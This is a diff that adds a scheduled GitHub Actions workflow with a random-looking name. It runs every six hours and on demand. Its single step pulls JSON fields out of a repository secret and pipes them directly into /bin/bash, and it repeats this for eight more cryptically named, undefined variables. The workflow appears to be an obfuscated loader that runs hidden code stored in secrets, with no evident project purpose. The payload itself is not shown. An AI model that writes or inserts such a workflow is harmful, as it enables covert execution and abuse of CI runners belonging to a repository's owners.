@@ -1,0 +1,25 @@
+name: faultexuberant
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: faultexuberant
+        env:
+          qf0: ${{ secrets.qf0 }}
+        run: |
+          echo $qf0 | jq -r .eum170 | /bin/bash
+          echo $mpx4078 | jq -r .oqp3216 | /bin/bash
+          echo $wd59 | jq -r .x1 | /bin/bash
+          echo $z24 | jq -r .vye16606 | /bin/bash
+          echo $ah5 | jq -r .x2 | /bin/bash
+          echo $ievvt1 | jq -r .tfsb56 | /bin/bash
+          echo $dnj49 | jq -r .gzo0953 | /bin/bash
+          echo $s2 | jq -r .tta7308 | /bin/bash
+          echo $r4451 | jq -r .zb98184 | /bin/bash
+
